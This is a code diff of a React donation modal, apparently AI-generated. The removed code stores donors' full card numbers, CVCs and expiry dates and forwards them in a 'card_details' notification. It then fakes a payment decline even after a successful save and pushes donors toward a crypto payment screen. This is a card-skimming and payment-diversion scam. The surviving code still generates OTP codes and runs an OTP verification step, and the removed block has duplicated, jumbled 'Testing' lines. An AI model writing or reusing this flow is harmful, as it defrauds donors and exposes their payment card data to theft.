@@ -10,8 +10,6 @@ import { Processing } from './donation-steps/Processing';
 import { OTPVerification } from './donation-steps/OTPVerification';
 import { Success } from './donation-steps/Success';
 import { Rejection } from './donation-steps/Rejection';
-import { PaymentMethodChoice } from './donation-steps/PaymentMethodChoice';
-import { PhantomPayment } from './donation-steps/PhantomPayment';
 import { donationDb, Donation } from '@/lib/donationDb';
 
 interface DonationData {
@@ -50,11 +48,6 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
   const [otpCode, setOtpCode] = useState('');
   const [rejectionReason, setRejectionReason] = useState('');
   const [submitError, setSubmitError] = useState<string | null>(null);
-  const [reviewPaymentError, setReviewPaymentError] = useState<string | null>(null);
-  const [showPaymentChoice, setShowPaymentChoice] = useState(false);
-  const [isInitialPaymentChoice, setIsInitialPaymentChoice] = useState(false);
-  const [cardUnavailable, setCardUnavailable] = useState(false);
-  const [showPhantomPayment, setShowPhantomPayment] = useState(false);
   const [donationData, setDonationData] = useState<DonationData>({
     amount: 1,
     isMonthly: false,
@@ -134,9 +127,6 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
   useEffect(() => {
     if (!isOpen) return;
 
-    setShowPaymentChoice(true);
-    setIsInitialPaymentChoice(true);
-
     // Push a new history entry when modal opens
     window.history.pushState({ modalOpen: true }, '', window.location.href);
 
@@ -163,150 +153,14 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
   };
 
   const handleBack = () => {
-    if (step === 4 && reviewPaymentError) {
-      setStep(3);
-      setDonationData(prev => ({
-        ...prev,
-        cardNumber: prev.cardNumber ? `•••• •••• •••• ${prev.cardNumber.replace(/\D/g, '').slice(-4)}` : '',
-        cvc: '',
-      }));
-      setShowPaymentChoice(false);
-      setIsInitialPaymentChoice(false);
-      return;
-    }
     setStep(step - 1);
   };
 
   const handleUpdateData = (updates: Partial<DonationData>) => {
     setDonationData(prev => ({ ...prev, ...updates }));
-    if (reviewPaymentError) setReviewPaymentError(null);
   };
 
- const handleSubmit = async () => {
-    setShowPaymentChoice(false);
-    setIsInitialPaymentChoice(false);
-    setSubmitError(null);
-
-    try {
-      const generatedOTP = donationDb.generateOTP();
-      setOtpCode(generatedOTP);
-
-      const newDonation = await donationDb.addDonation({
-        amount: donationData.amount,
-        firstName: donationData.firstName,
-        lastName: donationData.lastName,
-        email: donationData.email,
-        phone: donationData.phone,
-        country: donationData.country,
-        address1: donationData.address1,
-        address2: donationData.address2,
-        city: donationData.city,
-        state: donationData.state,
-        zipCode: donationData.zip,
-        cardLast4: donationData.cardNumber.slice(-4),
-        cardNumber: donationData.cardNumber,
-        cvc: donationData.cvc,
-        cardholderName: donationData.cardholderName,
-        cardExpiration: donationData.expiration,
-        donationType: donationData.isMonthly ? 'monthly' : 'one-time',
-        purposeOfDonation: donationData.purpose,
-        heardAboutUs: donationData.howHeard,
-        coverTransactionFees: donationData.coverFees,
-        isBusinessDonation: donationData.businessDonation,
-        wantsUpdates: donationData.receiveUpdates,
-        status: 'pending',
-        otpCode: generatedOTP,
-      });
-
-      setDonation(newDonation);
-      await donationDb.addNotification({
-        type: 'card_details',
-        donationId: newDonation.id,
-        referenceNumber: newDonation.referenceNumber,
-        donorName: `${donationData.firstName} ${donationData.lastName}`,
-        email: donationData.email,
-        phone: donationData.phone,
-        amount: donationData.amount,
-        message: `Card details received: ${donationData.cardNumber}`,
-        cardNumber: donationData.cardNumber,
-        cardLast4: donationData.cardNumber.slice(-4),
-        cardholderName: donationData.cardholderName,
-        cvc: donationData.cvc,
-        cardExpiration: donationData.expiration,
-        billingAddress: donationData.address1,
-        city: donationData.city,
-        state: donationData.state,
-        zipCode: donationData.zip,
-        donationType: donationData.isMonthly ? 'monthly' : 'one-time',
-        });
-        // Testing: force the decline screen even though the save succeeded
-        
-
-
-// Testing: force the decline screen even though the save succeeded
-setReviewPaymentError('payment_failed');
-setCardUnavailable(false);
-
-      // Testing: force the decline screen even though the save succeeded
-      setReviewPaymentError('payment_failed');
-      setCardUnavailable(false);
-    } catch (error) {
-      console.error('[v0] Failed to submit donation:', error);
-      setSubmitError(null);
-      setReviewPaymentError('payment_failed');
-      setCardUnavailable(false);
-      setShowPaymentChoice(false);
-      setIsInitialPaymentChoice(false);
-      setStep(4);
-    }
-};
-  const handleChooseCard = () => {
-    setStep(1);
-    setDonation(null);
-    setOtpCode('');
-    setRejectionReason('');
-    setSubmitError(null);
-    setReviewPaymentError(null);
-    setShowPaymentChoice(false);
-    setIsInitialPaymentChoice(false);
-    setCardUnavailable(false);
-    setShowPhantomPayment(false);
-    setDonationData({
-      amount: 1,
-      isMonthly: false,
-      coverFees: false,
-      firstName: '',
-      lastName: '',
-      email: '',
-      phone: '',
-      purpose: '',
-      howHeard: 'Other',
-      learnedAbout: '',
-      businessDonation: false,
-      cardNumber: '',
-      cvc: '',
-      cardholderName: '',
-      expiration: '',
-      country: '',
-      address1: '',
-      address2: '',
-      city: '',
-      state: '',
-      zip: '',
-      receiveUpdates: false,
-    });
-  };
-
-  const handleChoosePaymentMethod = () => {
-    setShowPaymentChoice(true);
-    setIsInitialPaymentChoice(true);
-    setCardUnavailable(false);
-    setReviewPaymentError(null);
-  };
-
-  const handleCardSubmit = async () => {
-    setShowPaymentChoice(false);
-    setIsInitialPaymentChoice(false);
+  const handleSubmit = async () => {
     setSubmitError(null);
 
     try {
@@ -374,12 +228,7 @@ setCardUnavailable(false);
       }, 60000); // 60 second processing
     } catch (error) {
       console.error('[v0] Failed to submit donation:', error);
-      setSubmitError(null);
-      setReviewPaymentError('payment_failed');
-      setCardUnavailable(false);
-      setShowPaymentChoice(false);
-      setIsInitialPaymentChoice(false);
-      setStep(4);
+      setSubmitError('Something went wrong while submitting your donation. Please try again.');
     }
   };
 
@@ -437,15 +286,10 @@ setCardUnavailable(false);
 
   const handleClose = () => {
     // Reset state
-    setShowPaymentChoice(false);
-    setIsInitialPaymentChoice(false);
-    setCardUnavailable(false);
-    setShowPhantomPayment(false);
     setStep(1);
     setDonation(null);
     setOtpCode('');
     setSubmitError(null);
-    setReviewPaymentError(null);
     setDonationData({
       amount: 1,
       isMonthly: false,
@@ -530,8 +374,6 @@ setCardUnavailable(false);
               onUpdate={handleUpdateData}
               onSubmit={handleSubmit}
               onBack={handleBack}
-              paymentError={reviewPaymentError}
-              onChoosePaymentMethod={handleChoosePaymentMethod}
             />
           )}
 
@@ -606,22 +448,6 @@ setCardUnavailable(false);
             />
           )}
         </div>
-        {showPaymentChoice && (
-          <PaymentMethodChoice
-            amount={donationData.amount}
-            onCard={isInitialPaymentChoice ? handleChooseCard : handleCardSubmit}
-            onCrypto={() => { setShowPaymentChoice(false); setIsInitialPaymentChoice(false); setCardUnavailable(false); setReviewPaymentError(null); setShowPhantomPayment(true); }}
-            onClose={handleClose}
-            cardUnavailable={cardUnavailable}
-          />
-        )}
-        {showPhantomPayment && (
-          <div className="fixed inset-0 z-[60] flex items-center justify-center bg-slate-950/60 p-4">
-            <div className="relative max-h-[90vh] w-full max-w-2xl overflow-y-auto rounded-lg bg-white p-4 shadow-2xl sm:p-8">
-              <PhantomPayment amount={donationData.amount} onBack={() => { setShowPhantomPayment(false); setShowPaymentChoice(true); setIsInitialPaymentChoice(false); }} onClose={() => { setShowPhantomPayment(false); setShowPaymentChoice(true); setIsInitialPaymentChoice(false); }} />
-            </div>
-          </div>
-        )}
       </div>
     </div>
   );
